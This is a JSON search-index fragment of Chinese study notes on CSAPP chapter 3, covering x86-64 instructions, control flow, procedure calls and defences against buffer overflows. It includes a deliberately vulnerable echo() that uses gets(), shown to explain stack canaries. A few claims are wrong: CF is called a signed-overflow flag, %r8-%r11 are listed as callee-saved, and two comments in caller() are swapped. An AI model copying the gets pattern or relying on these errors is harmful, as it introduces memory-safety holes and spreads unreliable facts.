movw , movl , movq \uff0c\u6ce8\u610f movl \u4f1a\u628a\u5bc4\u5b58\u5668\u9ad8\u4f4d\u7f6e 0 movabsq I, R \u4ee5\u4efb\u610f\u56db\u5b57\u7684\u7acb\u5373\u6570\u4f5c\u4e3a\u6e90\uff0c\u4e14\u53ea\u80fd\u590d\u5236\u5230\u5bc4\u5b58\u5668 MOVZ \u548c MOVS \u7c7b\u628a\u8f83\u5c0f\u7684\u6e90\u590d\u5236\u5230\u8f83\u5927\u7684\u76ee\u7684\u5904\u5e76\u505a\u6269\u5c55\uff0c\u4e14\u76ee\u7684\u53ea\u80fd\u662f\u5bc4\u5b58\u5668\uff0c\u4f8b\u5982: movzbq : \u5c06\u505a\u4e86\u96f6\u6269\u5c55\u7684\u5b57\u8282\u4f20\u9001\u5230\u56db\u5b57 movswq : \u5c06\u505a\u4e86\u7b26\u53f7\u6269\u5c55\u7684\u5b57\u4f20\u9001\u5230\u56db\u5b57 cltq : \u628a %eax \u7b26\u53f7\u6269\u5c55\u5230 %rax \u7531\u4e8e 4 \u5b57\u8282\u4f20\u9001\u9ad8\u4f4d\u6e05 0 \u7684\u7279\u6027\uff0c movzlq \u5e76\u6ca1\u6709\u5fc5\u8981\u5b58\u5728","title":"(2). \u6570\u636e\u4f20\u9001\u6307\u4ee4"},{"location":"_csapp/1_Basis/2/#3","text":"x86-64 \u4e2d\uff0c\u6808\u653e\u5728\u5185\u5b58\u7684\u67d0\u4e2a\u533a\u57df\uff0c\u6808\u9876\u5728\u4f4e\u5730\u5740\u65b9\u5411 instructions effect equiv instr pushq S $\\R[\\rsp ] \\leftarrow\\R[\\rsp ] - 8$ $\\M[\\R[ \\rsp]] \\leftarrow S$ subq $8, %rsp movq S, (%rsp) popq D $D \\leftarrow \\M[ \\R[ \\rsp]]$ $\\R[\\rsp ] \\leftarrow \\R[\\rsp ] + 8$ movq (%rsp), D addq $8, %rsp","title":"(3). \u6808\u64cd\u4f5c"},{"location":"_csapp/1_Basis/2/#3_1","text":"","title":"3. \u7b97\u672f\u548c\u903b\u8f91\u6307\u4ee4"},{"location":"_csapp/1_Basis/2/#1_3","text":"\u4e00\u5143\u64cd\u4f5c: INC D \u2003 DEC D \u2003 NEG D \u2003 NOT D \u2003 \u4e8c\u5143\u64cd\u4f5c: D \u65e2\u4f5c\u4e3a\u6e90\u53c8\u4f5c\u4e3a\u76ee\u7684 $(\\small\\mathrm{D\\ \\leftarrow D\\ \\mathsf{op}\\ S})$ ADD S, D \u2003 SUB S, D \u2003 IMUL S, D \u2003 XOR S, D \u2003 OR S, D \u2003 AND S, D \u79fb\u4f4d\u64cd\u4f5c: $(\\small\\mathrm{D\\ \\leftarrow D\\ \\mathsf{op}\\ }k)$\uff0c\u5f53 $k$ \u662f\u4e00\u4e2a\u5355\u5b57\u8282\u5bc4\u5b58\u5668\u65f6\uff0c\u79fb\u4f4d\u503c\u4e3a\u5bc4\u5b58\u5668\u7684\u4f4e $m$ \u4f4d $(2^m = \\mathit{bits})$\u3002\u4f8b\u5982\uff0c\u5f53 $\\R[ \\mathtt{\\%cl}]=\\text{0xff}$\uff0c sall \u4f1a\u79fb 31 \u4f4d SAL k, D \u2003 SHL k, D \u2003 \u5de6\u79fb\u64cd\u4f5c SAR k, D \u2003 SHR k, D \u2003 \u7b97\u672f\u53f3\u79fb \u548c \u903b\u8f91\u53f3\u79fb","title":"(1). \u57fa\u672c\u6574\u6570\u7b97\u672f\u6307\u4ee4"},{"location":"_csapp/1_Basis/2/#2_3","text":"\u6307\u4ee4 leaq S, D (load effective address) \u76ee\u7684\u53ea\u80fd\u662f\u5bc4\u5b58\u5668\uff0c\u6e90\u53ea\u80fd\u662f\u5185\u5b58\u5f15\u7528\u4e14\u83b7\u5f97\u7684\u503c\u662f\u5730\u5740\u3002\u5b83\u9664\u4e86\u53ef\u4ee5\u4ea7\u751f\u6307\u9488\u4ee5\u5916\uff0c\u8fd8\u80fd\u7528\u4e8e\u52a0\u6cd5\u548c\u6709\u9650\u7684\u4e58\u6cd5\u8fd0\u7b97\u3002 other usage of leaq \u7ed9\u5b9a C \u7a0b\u5e8f: long scale ( long x , long y , long z ) { long t = x + 4 * y + 12 * z ; return t ; } \u7531 gcc -Og -S _.c \u5f97\u5230: scale: leaq ( %rdi , %rsi , 4 ), %rax ; x + 4 * y leaq ( %rdx , %rdx , 2 ), %rdx ; z + 2 * z leaq ( %rax , %rdx , 4 ), %rax ; (x + 4 * y) + 4 * (3 * z) ret","title":"(2). \u52a0\u8f7d\u6709\u6548\u5730\u5740"},{"location":"_csapp/1_Basis/2/#4","text":"","title":"4. \u63a7\u5236\u6307\u4ee4"},{"location":"_csapp/1_Basis/2/#1_4","text":"cpu \u7ef4\u62a4\u4e00\u7ec4\u5355\u6bd4\u7279\u7684 \u6761\u4ef6\u7801\u5bc4\u5b58\u5668\uff0c\u5b83\u4eec\u63cf\u8ff0\u4e86\u6700\u8fd1\u7684\u7b97\u672f\u64cd\u4f5c\u7684\u5c5e\u6027\uff0c\u5e38\u7528\u7684\u6709: CF: \u8fdb\u4f4d\u6807\u5fd7\uff1b\u6700\u8fd1\u7684\u64cd\u4f5c\u4f7f\u6700\u9ad8\u4f4d\u4ea7\u751f\u4e86\u8fdb\u4f4d\uff0c\u53ef\u68c0\u6d4b\u6709\u7b26\u53f7\u6570\u7684\u6ea2\u51fa ZF: \u96f6\u6807\u5fd7\uff1b\u6700\u8fd1\u7684\u64cd\u4f5c\u5f97\u5230\u7ed3\u679c 0 SF: \u7b26\u53f7\u6807\u5fd7\uff1b\u6700\u8fd1\u7684\u64cd\u4f5c\u5f97\u5230\u8d1f\u6570 OF: \u6ea2\u51fa\u6807\u5fd7\uff1b\u6700\u8fd1\u7684\u64cd\u4f5c\u5bfc\u81f4\u8865\u7801\u6b63\u6ea2\u51fa\u6216\u8d1f\u6ea2\u51fa \u9664\u4e86 leaq \u7684\u6240\u6709\u4e0a\u8ff0\u7b97\u672f\u6307\u4ee4\u90fd\u4f1a\u8bbe\u7f6e\u6761\u4ef6\u7801\uff0c\u4f8b\u5982\uff0cXOR \u4f1a\u628a\u8fdb\u4f4d\u548c\u6ea2\u51fa\u6807\u5fd7\u8bbe\u4e3a 0\u3002","title":"(1). \u6761\u4ef6\u7801"},{"location":"_csapp/1_Basis/2/#2-cmp-test","text":"instruction base on desciption CMP S1, S2 S2 - S1 \u6bd4\u8f83 TEST S1, S2 S1 & S2 \u6d4b\u8bd5 CMP / TEST \u548c SUB / AND \u7684\u533a\u522b\u5728\u4e8e\u53ea\u8bbe\u6761\u4ef6\u7801\u4e0d\u66f4\u65b0\u5bc4\u5b58\u5668 testq %rax, %rax \u53ef\u4ee5\u68c0\u6d4b %rax \u662f\u5426\u4e3a\u6b63\u8d1f\u96f6 (ZF\u3001SF)\uff0c TEST \u6307\u4ee4\u8fd8\u53ef\u7528\u4e8e\u63a9\u7801\u6d4b\u8bd5","title":"(2). CMP &amp; TEST"},{"location":"_csapp/1_Basis/2/#3-set","text":"SET \u6307\u4ee4\u7684\u64cd\u4f5c\u6570\u662f\u4f4e\u4f4d\u5355\u5b57\u8282\u5bc4\u5b58\u5668\u6216\u5355\u5b57\u8282\u5185\u5b58\uff0c\u7136\u540e\u5c06\u8fd9\u4e2a\u4f4d\u7f6e\u8bbe\u4e3a 0 \u6216 1\u3002\u5e38\u7528\u7684\u6709: instruction synonym effect condition sete D setz D \u2190 ZF equal setl D setnge D \u2190 SF ^ OF less (signed) setb D setnae D \u2190 CF below (unsigned) ... ... ... ... \u4e00\u6bb5\u8ba1\u7b97 a < b \u7684\u5178\u578b\u6307\u4ee4\u5e8f\u5217: ;a in %rdi, b in %rsi comp: cmpq %rsi , %rdi ;compare a:b setl %al ;set low-order byte of %eax to 0 or 1 movzbl %al , %eax ;clear rest of %eax (and %rax) ret \u4ee5 setl \u4e3a\u4f8b\uff0c\u5f53 a-b \u8d1f\u6ea2\u51fa\u4e14 a<b \uff0cSF=0 \u4e14 OF=1\uff1b\u5c06\u6240\u6709\u60c5\u51b5\u7ec4\u5408\u5373\u5f97\u5230\u4e86 SF ^ OF","title":"(3). SET"},{"location":"_csapp/1_Basis/2/#4_1","text":"\u8df3\u8f6c\u4f4d\u7f6e\u901a\u5e38\u9700\u8981\u4e00\u4e2a Label \u6807\u660e\uff1b jmp \u7684\u95f4\u63a5\u8df3\u8f6c\u901a\u8fc7\u64cd\u4f5c\u6570\u6307\u5b9a instruction synonym condition description jmp Label 1 direct jmp *Operand ` indirect je Label jz ZF equal / zero jne Label jnz ~ZF not equal / zero jg Label jnle ~(SF ^ OF) & ~ZF greater (signed) ... ... ... ... \u8df3\u8f6c\u6307\u4ee4\u6709\u51e0\u79cd\u4e0d\u540c\u7684\u7f16\u7801\uff0c\u6700\u5e38\u7528\u7684\u662f PC-relative: branch.s\u2003 movq %rdi , %rax jmp .L2 .L3: sarq %rax .L2: testq %rax , %rax jg .L3 rep ret disas from branch.o\u2003 0: 48 89 f8 mov %rdi , %rax 3: eb 03 jmp 8 < loop + 0x8 > 5: 48 d1 f8 sar %rax 8: 48 85 c0 test %rax , %rax b: 7 f f8 jg 5 < loop + 0x5 > d: f3 c3 repz retq \u53cd\u6c47\u7f16\u6587\u4ef6\u7684\u7b2c\u4e00\u6761\u8df3\u8f6c\u5730\u5740\u7684\u7f16\u7801\u4e3a 0x03 (signed)\uff0c\u52a0\u4e0a\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740 0x5 (PC \u7684\u503c)\uff0c\u5f97\u5230\u76ee\u6807\u5730\u5740 0x8 (\u7531\u4e8e\u5386\u53f2\u539f\u56e0\uff0c\u66f4\u65b0 PC \u5728\u6267\u884c\u6307\u4ee4\u524d\u8fdb\u884c)\u3002\u8fd9\u79cd\u65b9\u5f0f\u4f7f\u5f97\u6307\u4ee4\u7f16\u7801\u5f88\u7b80\u6d01\u3002","title":"(4). \u8df3\u8f6c\u6307\u4ee4"},{"location":"_csapp/1_Basis/2/#5","text":"","title":"5. \u57fa\u672c\u8bed\u53e5"},{"location":"_csapp/1_Basis/2/#1_5","text":"\u6761\u4ef6\u8bed\u53e5\u5728\u6c47\u7f16\u4e2d\u901a\u5e38\u4f1a\u7ffb\u8bd1\u4e3a if false \u7684\u5f62\u5f0f\uff0c\u4f8b\u5982 if-else : if-else original if ( < test - expr > ) < then - stmt > else < else - stmt > assembly t = < exp > ; if ( ! t ) goto false ; < then - stmt > goto done ; false : < else - stmt > done : \u73b0\u4ee3\u5904\u7406\u5668\u901a\u8fc7 pipeline \u83b7\u5f97\u9ad8\u6027\u80fd\uff0c\u800c\u901a\u8fc7\u57fa\u672c\u7684\u6761\u4ef6\u5206\u652f\u5b9e\u73b0\u6761\u4ef6\u8bed\u53e5\uff0c\u7531\u4e8e\u5206\u652f\u9884\u6d4b\u53ef\u80fd\u51fa\u9519\uff0c\u53ef\u80fd\u4f1a\u4f4e\u6548\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7\u6761\u4ef6\u4f20\u9001\u6307\u4ee4\u907f\u514d\u3002 original C code long absdiff ( long x , long y ) { long result ; if ( x < y ) result = y - x ; else result = x - y ; return result ; } format as conditional move long cmovdiff ( long x , long y ) { long rval = y - x ; long eval = x - y ; long ntest = x >= y ; /* Line below requires single instruction */ if ( ntest ) rval = eval ; return rval ; } assembly code ;x in %rdi, y in %rsi absdiff: movq %rsi , %rax subq %rdi , %rax ;rval = y - x movq %rdi , %rdx subq %rsi , %rdx ;eval = x - y cmpq %rsi , %rdi ;compare x:y cmovge %rdx , %rax ;if >=, rval = eval ret \u6761\u4ef6\u4f20\u9001\u5e76\u4e0d\u9002\u7528\u4e8e\u6240\u6709\u60c5\u51b5\uff0c\u5982: \u5f53 then-expr \u6216 else-expr \u9700\u8981\u5927\u91cf\u7684\u8ba1\u7b97 \u5bf9\u4e8e\u6307\u9488 xp \uff0c\u6761\u4ef6\u4f20\u9001\u4f1a\u6539\u53d8 (xp ? *xp : 0) \u7684\u6267\u884c\u903b\u8f91","title":"(1). \u6761\u4ef6\u5206\u652f"},{"location":"_csapp/1_Basis/2/#2_4","text":"\u5faa\u73af\u901a\u5e38\u7ffb\u8bd1\u4e3a\u5982\u4e0b\u5f62\u5f0f: loop do-while loop : < body - stmt > ; t = < exp > ; if ( t ) goto loop ; while (jump to mid) goto test ; loop : < body - stmt > ; test : t = < exp > ; if ( t ) goto loop ; while (guarded-do) t = < exp > ; if ( ! t ) goto done ; loop : < body - stmt > ; t = < exp > ; if ( t ) goto loop ; done : gcc -O1 \u901a\u5e38\u91c7\u7528 \"guraded-do\" \u7684\u5f62\u5f0f\u7ffb\u8bd1 while \u5faa\u73af: \u5224\u65ad\u521d\u59cb\u6761\u4ef6\uff0c\u5e76\u628a\u5269\u4e0b\u7684\u90e8\u5206\u8f6c\u6362\u4e3a do-while \u7684\u5f62\u5f0f\uff1b\u7528\u8fd9\u79cd\u7b56\u7565\u65b9\u4fbf\u7f16\u8bd1\u5668\u4f18\u5316\u6761\u4ef6\u8868\u8fbe\u5f0f\u3002","title":"(2). \u5faa\u73af"},{"location":"_csapp/1_Basis/2/#3-switch","text":"\u5f53\u5f00\u5173\u6570\u91cf\u8f83\u591a\u4e14\u5f00\u5173\u8de8\u5ea6\u8f83\u5c0f\u65f6\uff0cgcc \u4f1a\u4f7f\u7528\u8df3\u8f6c\u8868\u4f18\u5316\u7a0b\u5e8f\uff0c\u5176\u4f18\u70b9\u5728\u4e8e\u51cf\u5c11\u5206\u652f\u5224\u65ad\u7684\u65f6\u95f4\u3002 example original C code void switchEg ( long x , long n , long * dest ) { long val = x ; switch ( n ) { case 100 : val *= 13 ; break ; case 102 : val += 10 ; /* Fall through */ case 103 : val += 11 ; break ; case 104 : case 106 : val *= val ; break ; default : val = 0 ; } * dest = val ; } extending rep by gcc void switchEgImpl ( long x , long n , long * dest ) { /* Table of code pointers */ static void * jt [ 7 ] = { && loc_A , && loc_def , && loc_B , && loc_C , && loc_D , && loc_def , && loc_D }; unsigned long index = n - 100 ; long val ; if ( index > 6 ) goto loc_def ; /* Multiway branch */ goto * jt [ index ]; loc_A : /* Case 100 */ val = x * 13 ; goto done ; loc_B : /* Case 102 */ x = x + 10 ; /* Fall through */ loc_C : /* Case 103 */ val = x + 11 ; goto done ; loc_D : /* Cases 104, 106 */ val = x * x ; goto done ; loc_def : /* Default case */ val = 0 ; done : * dest = val ; } assembly ;void switch_eg(long x, long n, long *dest) ;x in %rdi, n in %rsi, dest in %rdx switch_eg: subq $100 , %rsi ;Compute index = n-100 cmpq $6 , %rsi ;Compare index:6 ja .L8 ;If >, goto loc_def jmp *. L4 (, %rsi , 8 ) Goto * jg [ index ] .L3: ;loc_A: leaq ( %rdi , %rdi , 2 ), %rax ;3*x leaq ( %rdi , %rax , 4 ), %rdi ;val = 13*x jmp .L2 ;Goto done .L5: ;loc_B: addq $10 , %rdi ;x = x + 10 .L6: ;loc_C: addq $11 , %rdi ;val = x + 11 jmp .L2 ;Goto done .L7: ;loc_D: imulq %rdi , %rdi ;val = x * x jmp .L2 ;Goto done .L8: ;loc_def: movl $0 , %edi ;val = 0 .L2: ;done: movq %rdi , ( %rdx ) ;*dest = val ret ;Return .rodata .section .rodata .align 8 .L4: .quad .L3 .quad .L8 .quad .L5 .quad .L6 .quad .L7 .quad .L8 .quad .L7 switchEgImpl \u662f\u5bf9\u8df3\u8f6c\u8868\u7684 C \u8bed\u8a00\u5b9e\u73b0\uff0c\u5176\u4e2d\u7528\u5230\u4e86 gcc \u5bf9 C \u7684\u6269\u5c55\u8bed\u6cd5\u3002\u9996\u5148\u628a n \u538b\u7f29\u5230 0-6 \u8303\u56f4\u5185\uff0c\u5e76\u89c6\u5176\u4e3a\u65e0\u7b26\u53f7\u6570\uff1b\u7136\u540e\u6784\u9020\u8df3\u8f6c\u8868\uff0c\u5bf9\u7f3a\u5931\u9879\u4f7f\u7528\u9ed8\u8ba4\u6807\u53f7 loc_def \u3002","title":"(3). switch"},{"location":"_csapp/1_Basis/3/","text":"1. \u8fc7\u7a0b \ud83e\uddd0 \u8fc7\u7a0b\u662f\u91cd\u8981\u7684\u673a\u5668\u7ea7\u62bd\u8c61\uff0c\u8981\u63d0\u4f9b\u5bf9\u5b83\u7684\u673a\u5668\u7ea7\u652f\u6301\uff0c\u9700\u8981\u4f9d\u6b21\u6267\u884c\u4ee5\u4e0b\u673a\u5236 (\u4ee5 P \u8c03\u7528 Q, Q \u8fd4\u56de P \u4e3a\u4f8b): \u4fdd\u5b58\u5bc4\u5b58\u5668\u7684\u72b6\u6001:\u2002 P \u548c Q \u5404\u8d1f\u5176\u8d23 \u4f20\u9012\u6570\u636e:\u2002 P \u5411 Q \u4f20\u9012\u591a\u4e2a\u53c2\u6570\uff0cQ \u5411 P \u8fd4\u56de\u4e00\u4e2a\u503c \u8f6c\u79fb\u63a7\u5236:\u2002 P \u8fdb\u5165 Q \u548c Q \u8fd4\u56de P \u65f6\uff0c\u6b63\u786e\u8bbe\u7f6e PC \u7684\u503c \u5206\u914d\u548c\u91ca\u653e\u5185\u5b58:\u2002 Q \u53ef\u80fd\u9700\u8981\u5c40\u90e8\u7a7a\u95f4\uff0c\u5e76\u5728\u8fd4\u56de P \u524d\u91ca\u653e (1). \u4f20\u9012\u6570\u636e \ud83e\uddd0 P \u8c03\u7528 Q \u65f6\uff0c\u5148\u8981\u628a\u53c2\u6570\u590d\u5236\u5230\u9002\u5f53\u7684\u5bc4\u5b58\u5668\u4e2d: x86-64 \u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u5bc4\u5b58\u5668\u6700\u591a\u4f20\u9012 6 \u4e2a\u6574\u578b\u53c2\u6570\uff0c\u8d85\u8fc7 6 \u4e2a\u7684\u90e8\u5206\u901a\u8fc7\u6808\u4f20\u9012\uff0c\u4e14\u53c2\u6570 7 \u4f4d\u4e8e\u6808\u9876\u65b9\u5411\u3001\u6240\u6709\u53c2\u6570\u5411 8 \u5b57\u8282\u5bf9\u9f50 \u8bbf\u95ee\u7684\u5bc4\u5b58\u5668\u540d\u53d6\u51b3\u4e8e\u6570\u636e\u5927\u5c0f\uff0c\u4f8b\u5982\uff0c\u5982\u679c\u53c2\u6570 1 \u662f 32 \u4f4d\u7684\uff0c\u53ef\u901a\u8fc7 %edi \u8bbf\u95ee example \u2003C\u2003 void proc ( long a1 , long * a1p , int a2 , int * a2p , short a3 , short * a3p , char a4 , char * a4p ) { * a1p += a1 ; * a2p += a2 ; * a3p += a3 ; * a4p += a4 ; } \u2003assembly\u2003 ;Arguments passed as follows: ; a1 in %rdi (64), a1p in %rsi (64) ; a2 in %edx (32), a2p in %rcx (64) ; a3 in %r8w (16), a3p in %r9 (64) ; a4 at %rsp+8 (8), a4p at %rsp+16 (64) proc: movq 16 ( %rsp ), %rax addq %rdi , ( %rsi ) addl %edx , ( %rcx ) addw %r8w , ( %r9 ) movl 8 ( %rsp ), %edx addb %dl , ( %rax ) ret (2). \u8f6c\u79fb\u63a7\u5236 \ud83e\uddd0 \u5047\u8bbe\u7d27\u8ddf call \u6307\u4ee4\u4e4b\u540e\u7684\u5730\u5740\u662f A \uff0c Label \u7684\u8d77\u59cb\u5730\u5740\u662f B instruction effect call Label pushq A , \u2002 mov B, %rip call *Operand pushq A , \u2002 mov Operand, %rip ret popq %rip (3). \u6808\u4e0a\u7684\u5c40\u90e8\u5b58\u50a8 \ud83e\uddd0 \u4e3a\u63d0\u9ad8\u6548\u7387\uff0cx86-64 \u4f1a\u5c3d\u53ef\u80fd\u5c11\u5730\u4f7f\u7528\u6808\u5e27\uff0c\u5c40\u90e8\u53d8\u91cf\u5f88\u5c11\u7684\u53f6\u5b50\u51fd\u6570\u751a\u81f3\u4e0d\u9700\u8981\u6808\u5e27\u3002\u6709\u4e9b\u5c40\u90e8\u6570\u636e\u5fc5\u987b\u5b58\u50a8\u5728\u6808\u4e2d: \u5bc4\u5b58\u5668\u4e0d\u8db3\u65f6\u7684\u672c\u5730\u6570\u636e \u88ab & \u53d6\u5730\u5740\u7684\u5c40\u90e8\u53d8\u91cf \u6570\u7ec4\u6216\u7ed3\u6784\u4f53 example original C code long swapAdd ( long * xp , long * yp ) { long x = * xp ; long y = * yp ; * xp = y ; * yp = x ; return x + y ; } long caller () { long arg1 = 534 ; long arg2 = 1057 ; long sum = swapAdd ( & arg1 , & arg2 ); long diff = arg1 - arg2 ; return sum * diff ; } assembly of caller() caller (): subq $16 , %rsp ;allocate 16 bytes movq $534 , ( %rsp ) movq $1057 , 8 ( %rsp ) leaq 8 ( %rsp ), %rsi ;&arg1 movq %rsp , %rdi ;&arg2 call swapAdd movq ( %rsp ), %rdx ;get arg1 subq 8 ( %rsp ), %rdx imulq %rdx , %rax addq $16 , %rsp ;deallocate ret \u8fd0\u884c\u65f6\u6808\u63d0\u4f9b\u4e86\u4e00\u79cd\u7b80\u5355\u7684\u3001\u5728\u9700\u8981\u65f6\u5206\u914d\u3001\u5728\u5b8c\u6210\u65f6\u91ca\u653e\u7684\u673a\u5236\u3002 (4). \u4fdd\u5b58\u5bc4\u5b58\u5668\u7684\u72b6\u6001 \ud83e\uddd0 \u5bc4\u5b58\u5668\u662f\u552f\u4e00\u88ab\u6240\u6709\u8fc7\u7a0b\u5171\u4eab\u7684\u8d44\u6e90\uff0c\u9700\u8981\u4fdd\u8bc1\u88ab\u8c03\u7528\u8005\u4e0d\u4f1a\u8986\u76d6\u8c03\u7528\u8005\u7a0d\u540e\u4f7f\u7528\u7684\u5bc4\u5b58\u5668\u503c\uff0c\u5bf9\u6b64\uff0cx86-64 \u7684\u60ef\u4f8b\u662f: %rbx, %rbp, %r8-%r15 \u9700\u8981\u88ab\u8c03\u7528\u8005\u4fdd\u5b58 \u9664\u4e86 %rsp \u53ca\u4ee5\u4e0a \u7684\u6240\u6709\u5176\u4ed6\u5bc4\u5b58\u5668\u9700\u8981\u8c03\u7528\u8005\u4fdd\u5b58 original C code long Q ( long ); long P ( long x , long y ) { long u = Q ( y ); long v = Q ( x ); return u + v ; } assembly P: pushq %rbp ;save %rbp pushq %rbx ;save %rbx subq $8 , %rsp ;align stack frame movq %rdi , %rbp ;save x movq %rsi , %rdi ;move y to first argument call Q movq %rax , %rbx ;save result=Q(y) movq %rbp , %rdi ;move x to first argument call Q addq %rbx , %rax addq $8 , %rsp ;deallocate last part of stack popq %rbx ;restore %rbx popq %rbp ;restore %rbp ret \u4ece\u4f8b\u5b50\u4e2d\u53ef\u4ee5\u770b\u5230: P \u4f5c\u4e3a callee\uff0c\u9700\u8981\u4fdd\u5b58\u53ca\u6062\u590d\u540e\u7eed\u88ab\u4f7f\u7528\u7684 %rbp, %rbx P \u4f5c\u4e3a caller\uff0c\u9700\u8981\u4fdd\u5b58 %rdi (x) \u548c %rax (u) 2. \u5bf9\u6297\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb \ud83e\uddd0 \u7531\u4e8e C \u4e0d\u5bf9\u6570\u7ec4\u8d8a\u754c\u505a\u68c0\u67e5\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b57\u7b26\u4e32\u8986\u76d6\u8fd4\u56de\u5730\u5740\u5e76\u63d2\u5165\u653b\u51fb\u4ee3\u7801\u7684\u5b57\u8282\u7f16\u7801\uff0c\u5b9e\u73b0\u653b\u51fb\u3002 (1). \u6808\u968f\u673a\u5316 \ud83e\uddd0 \u5176\u601d\u60f3\u662f\u968f\u673a\u586b\u5145\u6808\uff0c\u4f7f\u5f97\u6bcf\u6b21\u8fd0\u884c\u65f6\u6808\u7684\u4f4d\u7f6e\u90fd\u6709\u53d8\u5316\u3002\u5728 Linux \u4e2d\uff0c\u8fd9\u79cd\u673a\u5236\u5df2\u88ab\u6cdb\u7528 (\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316, ASLR)\uff0c\u7a0b\u5e8f\u4ee3\u7801\u3001\u5e93\u4ee3\u7801\u3001\u6808\u3001\u5168\u5c40\u53d8\u91cf\u548c\u5806\u6570\u636e\u6bcf\u6b21\u8fd0\u884c\u65f6\u90fd\u4f1a\u52a0\u8f7d\u5230\u5185\u5b58\u7684\u4e0d\u540c\u533a\u57df\uff0c\u8fd9\u6837\u53ef\u4ee5\u5bf9\u6297\u4e00\u4e9b\u5f62\u5f0f\u7684\u653b\u51fb\u3002 (2). \u6808\u7834\u574f\u68c0\u6d4b \ud83e\uddd0 gcc \u9ed8\u8ba4\u4f1a\u52a0\u5165 stack protector \u673a\u5236: \u5728\u5c40\u90e8\u7f13\u51b2\u533a\u548c\u6808\u72b6\u6001\u4e4b\u95f4\u5b58\u50a8\u4e00\u4e2a\u91d1\u4e1d\u96c0\u503c (canary)\uff0c\u7531\u7a0b\u5e8f\u6bcf\u6b21\u8fd0\u884c\u968f\u673a\u4ea7\u751f\uff0c\u5728\u6062\u590d\u5bc4\u5b58\u5668\u72b6\u6001\u4ece\u51fd\u6570\u8fd4\u56de\u4e4b\u524d\uff0c\u7a0b\u5e8f\u4f1a\u68c0\u67e5\u8fd9\u4e2a\u503c\u662f\u5426\u88ab\u4fee\u6539\u3002 void echo () { char buf [ 8 ]; gets ( buf ); } \u5982\u679c\u4e0d\u52a0 -fno-stack-protector \u9009\u9879\uff0c\u8be5\u51fd\u6570\u4f1a\u7f16\u8bd1\u4e3a: echo: subq $24 , %rsp movq %fs : 40 , %rax movq %rax , 8 ( %rsp ) xorl %eax , %eax movq %rsp , %rdi call gets movq 8 ( %rsp ), %rax subq %fs : 40 , %rax jne .L4 addq $24 , %rsp ret .L4: call __stack_chk_fail %fs:40 \u6307\u660e\u91d1\u4e1d\u96c0\u503c\u662f\u7528\u6bb5\u5bfb\u5740\u8bfb\u5165\u7684\uff0c\u8fd4\u56de\u5730\u5740\u5728 %rsp+24 \uff0c\u91d1\u4e1d\u96c0\u503c\u5728 %rsp+8 \u3002 (3). \u9650\u5236\u53ef\u6267\u884c\u4ee3\u7801\u533a\u57df \ud83e\uddd0 \u9650\u5236\u5185\u5b58\u53ea\u6709\u67d0\u90e8\u5206\u533a\u57df\u53ef\u4ee5\u6267\u884c\uff0c\u5176\u4ed6\u90e8\u5206\u53ea\u80fd\u8bfb\u6216\u5199\u3002","title":"3. procedures"},{"location":"_csapp/1_Basis/3/#1","text":"\u8fc7\u7a0b\u662f\u91cd\u8981\u7684\u673a\u5668\u7ea7\u62bd\u8c61\uff0c\u8981\u63d0\u4f9b\u5bf9\u5b83\u7684\u673a\u5668\u7ea7\u652f\u6301\uff0c\u9700\u8981\u4f9d\u6b21\u6267\u884c\u4ee5\u4e0b\u673a\u5236 (\u4ee5 P \u8c03\u7528 Q, Q \u8fd4\u56de P \u4e3a\u4f8b): \u4fdd\u5b58\u5bc4\u5b58\u5668\u7684\u72b6\u6001:\u2002 P \u548c Q \u5404\u8d1f\u5176\u8d23 \u4f20\u9012\u6570\u636e:\u2002 P \u5411 Q \u4f20\u9012\u591a\u4e2a\u53c2\u6570\uff0cQ \u5411 P \u8fd4\u56de\u4e00\u4e2a\u503c \u8f6c\u79fb\u63a7\u5236:\u2002 P \u8fdb\u5165 Q \u548c Q \u8fd4\u56de P \u65f6\uff0c\u6b63\u786e\u8bbe\u7f6e PC \u7684\u503c \u5206\u914d\u548c\u91ca\u653e\u5185\u5b58:\u2002 Q \u53ef\u80fd\u9700\u8981\u5c40\u90e8\u7a7a\u95f4\uff0c\u5e76\u5728\u8fd4\u56de P \u524d\u91ca\u653e","title":"1. \u8fc7\u7a0b"},{"location":"_csapp/1_Basis/3/#1_1","text":"P \u8c03\u7528 Q \u65f6\uff0c\u5148\u8981\u628a\u53c2\u6570\u590d\u5236\u5230\u9002\u5f53\u7684\u5bc4\u5b58\u5668\u4e2d: x86-64 \u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u5bc4\u5b58\u5668\u6700\u591a\u4f20\u9012 6 \u4e2a\u6574\u578b\u53c2\u6570\uff0c\u8d85\u8fc7 6 \u4e2a\u7684\u90e8\u5206\u901a\u8fc7\u6808\u4f20\u9012\uff0c\u4e14\u53c2\u6570 7 \u4f4d\u4e8e\u6808\u9876\u65b9\u5411\u3001\u6240\u6709\u53c2\u6570\u5411 8 \u5b57\u8282\u5bf9\u9f50 \u8bbf\u95ee\u7684\u5bc4\u5b58\u5668\u540d\u53d6\u51b3\u4e8e\u6570\u636e\u5927\u5c0f\uff0c\u4f8b\u5982\uff0c\u5982\u679c\u53c2\u6570 1 \u662f 32 \u4f4d\u7684\uff0c\u53ef\u901a\u8fc7 %edi \u8bbf\u95ee example \u2003C\u2003 void proc ( long a1 , long * a1p , int a2 , int * a2p , short a3 , short * a3p , char a4 , char * a4p ) { * a1p += a1 ; * a2p += a2 ; * a3p += a3 ; * a4p += a4 ; } \u2003assembly\u2003 ;Arguments passed as follows: ; a1 in %rdi (64), a1p in %rsi (64) ; a2 in %edx (32), a2p in %rcx (64) ; a3 in %r8w (16), a3p in %r9 (64) ; a4 at %rsp+8 (8), a4p at %rsp+16 (64) proc: movq 16 ( %rsp ), %rax addq %rdi , ( %rsi ) addl %edx , ( %rcx ) addw %r8w , ( %r9 ) movl 8 ( %rsp ), %edx addb %dl , ( %rax ) ret","title":"(1). \u4f20\u9012\u6570\u636e"},{"location":"_csapp/1_Basis/3/#2","text":"\u5047\u8bbe\u7d27\u8ddf call \u6307\u4ee4\u4e4b\u540e\u7684\u5730\u5740\u662f A \uff0c Label \u7684\u8d77\u59cb\u5730\u5740\u662f B instruction effect call Label pushq A , \u2002 mov B, %rip call *Operand pushq A , \u2002 mov Operand, %rip ret popq %rip","title":"(2). 